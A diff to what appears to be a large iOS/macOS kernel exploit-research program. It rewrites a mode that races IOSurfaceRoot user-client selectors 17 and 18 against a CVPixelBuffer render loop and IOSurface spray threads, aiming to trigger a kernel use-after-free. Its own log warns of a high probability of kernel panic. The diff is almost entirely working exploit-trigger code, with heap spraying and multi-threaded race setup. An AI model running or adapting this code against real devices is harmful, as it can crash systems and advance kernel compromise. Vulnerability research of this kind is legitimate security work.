@@ -19700,10 +19700,11 @@ new_modes:
             goto done;
         }
         if (rounds == 252) {
-            rlog("*** rounds=252: Pure render-loop UAF (no sel17/18) ***\n");
-            rlog("  The real UAF is in p13_render_loop: CVPixelBuffer engages compositor,\n");
-            rlog("  then IOSurface is freed while compositor async pipeline still holds ptr.\n");
-            rlog("  Tight create→CVPixelBuffer→release cycle with spray to reclaim freed objects.\n\n");
+            rlog("*** rounds=252: Multi-threaded CVPixelBuffer UAF ***\n");
+            rlog("  Thread A: p13_render_loop (create/CVPixelBuffer/release at 60fps)\n");
+            rlog("  Thread B+C: sel17/18 race on shared connection (memory pressure)\n");
+            rlog("  Thread D: IOSurface spray/release churn (zone contention)\n");
+            rlog("  All running concurrently for maximum race window.\n\n");
 
             char r252_sp[256];
             { char *h = getenv("HOME"); snprintf(r252_sp, sizeof(r252_sp), "%s/Documents/uaf252_state.bin", h?h:"/tmp"); }
@@ -19717,81 +19718,54 @@ new_modes:
                 IOServiceMatching("IOSurfaceRoot"));
             if (!r252_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r252_done; }
 
-            CFMutableDictionaryRef r252_props = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            int r252_w = 64, r252_h = 64, r252_bpe = 4, r252_bpr = r252_w * r252_bpe;
-            int r252_pf = 0x42475241;
-            CFNumberRef r252_wn = CFNumberCreate(NULL, kCFNumberIntType, &r252_w);
-            CFNumberRef r252_hn = CFNumberCreate(NULL, kCFNumberIntType, &r252_h);
-            CFNumberRef r252_bn = CFNumberCreate(NULL, kCFNumberIntType, &r252_bpe);
-            CFNumberRef r252_rn = CFNumberCreate(NULL, kCFNumberIntType, &r252_bpr);
-            CFNumberRef r252_pfn = CFNumberCreate(NULL, kCFNumberIntType, &r252_pf);
-            CFDictionarySetValue(r252_props, CFSTR("IOSurfaceWidth"), r252_wn);
-            CFDictionarySetValue(r252_props, CFSTR("IOSurfaceHeight"), r252_hn);
-            CFDictionarySetValue(r252_props, CFSTR("IOSurfaceBytesPerElement"), r252_bn);
-            CFDictionarySetValue(r252_props, CFSTR("IOSurfaceBytesPerRow"), r252_rn);
-            CFDictionarySetValue(r252_props, CFSTR("IOSurfacePixelFormat"), r252_pfn);
-
-            /* Strategy: Aggressive create→compositor-engage→release cycle
-             * WITHOUT the 16ms sleep — no delay, maximizing race window.
-             * Also add sel17/18 churn to increase kernel memory pressure. */
-
             io_connect_t r252_conn = IO_OBJECT_NULL;
             IOServiceOpen(r252_svc, mach_task_self(), 0, &r252_conn);
             if (!r252_conn) { rlog("  open failed\n"); IOObjectRelease(r252_svc); goto r252_done; }
 
-            mach_port_t r252_wp = MACH_PORT_NULL;
-            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &r252_wp);
-            mach_port_insert_right(mach_task_self(), r252_wp, r252_wp, MACH_MSG_TYPE_MAKE_SEND);
-
-            int r252_iters = 10000;
-            if (argc > 3) r252_iters = atoi(argv[3]);
-            rlog("  Iterations: %d\n", r252_iters);
+            int r252_secs = 10;
+            if (argc > 3) r252_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r252_secs);
             rlog("  >>> WARNING: HIGH PROBABILITY OF KERNEL PANIC <<<\n");
             fflush(stdout);
 
-            int r252_created = 0, r252_px_ok = 0;
-            for (int i = 0; i < r252_iters; i++) {
-                /* Create IOSurface */
-                IOSurfaceRef s = IOSurfaceCreate(r252_props);
-                if (!s) continue;
-                r252_created++;
+            /* Thread A: render loop (CVPixelBuffer churn) */
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t r252_render;
+            pthread_create(&r252_render, NULL, p13_render_loop, NULL);
 
-                /* Engage compositor via CVPixelBuffer */
-                CVPixelBufferRef pb = NULL;
-                CVPixelBufferCreateWithIOSurface(NULL, s, NULL, &pb);
-                if (pb) {
-                    r252_px_ok++;
-                    CFRelease(pb);
-                }
+            /* Threads B+C: sel17/18 race (memory pressure) */
+            g_race250_conn = r252_conn;
+            g_race250_run = 1;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r252_t17, r252_t18;
+            pthread_create(&r252_t17, NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r252_t18, NULL, g_race250_sel18_fn, NULL);
 
-                /* Release IOSurface — kernel object may be freed
-                 * while compositor async pipeline still holds reference */
-                CFRelease(s);
-
-                /* NO sleep — tight loop, maximizing race window */
-
-                /* Add sel17/18 churn for memory pressure (every 10th iter) */
-                if (i % 10 == 0) {
-                    uint64_t inp[3] = {1, 2, 3};
-                    uint64_t ref = 0xD252;
-                    IOConnectCallAsyncMethod(r252_conn, 17, r252_wp, &ref, 1,
-                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
-                    IOConnectCallMethod(r252_conn, 18, NULL, 0,
-                        inp, 24, NULL, NULL, NULL, NULL);
-                }
-
-                if (i > 0 && i % 1000 == 0)
-                    rlog("  Progress: %d/%d created=%d px=%d\n", i, r252_iters, r252_created, r252_px_ok);
+            /* Monitor */
+            for (int s = 0; s < r252_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds reg=%d/%d dereg=%d/%d frames=%d\n", s+1,
+                     g_race250_reg_ok, g_race250_reg_fail,
+                     g_race250_dereg_ok, g_race250_dereg_fail,
+                     p13_render_frames);
             }
 
-            rlog("\n  === SURVIVED %d iterations! ===\n", r252_iters);
-            rlog("  created=%d  px_ok=%d\n", r252_created, r252_px_ok);
+            /* Stop everything */
+            g_race250_run = 0;
+            p13_render_run = 0;
+            pthread_join(r252_t17, NULL);
+            pthread_join(r252_t18, NULL);
+            pthread_join(r252_render, NULL);
 
-            mach_port_deallocate(mach_task_self(), r252_wp);
+            rlog("\n  === SURVIVED multi-threaded CVPixelBuffer UAF! ===\n");
+            rlog("  Total: reg=%d/%d dereg=%d/%d frames=%d\n",
+                 g_race250_reg_ok, g_race250_reg_fail,
+                 g_race250_dereg_ok, g_race250_dereg_fail,
+                 p13_render_frames);
+
             IOServiceClose(r252_conn);
-            CFRelease(r252_props); CFRelease(r252_wn); CFRelease(r252_hn);
-            CFRelease(r252_bn); CFRelease(r252_rn); CFRelease(r252_pfn);
             IOObjectRelease(r252_svc);
             r252_done:
             rlog("*** r=252 complete ***\n");
